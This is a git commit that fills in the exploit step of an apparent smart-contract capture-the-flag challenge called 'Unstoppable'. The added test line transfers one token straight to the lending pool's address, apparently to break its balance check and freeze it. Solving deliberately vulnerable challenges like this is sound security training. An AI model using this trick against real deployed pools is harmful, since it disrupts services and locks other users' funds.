870fde5d8815231c10db5bd5db0da5a694fc26a3
ripwu <iripwu@gmail.com>
2021-08-25 20:08:37 +0800

    unstoppable

--- test/unstoppable/unstoppable.challenge.js
+++ test/unstoppable/unstoppable.challenge.js
@@ -40,6 +40,7 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        await this.token.transfer(this.pool.address, 1, { from: attacker });
     });
 
     after(async function () {
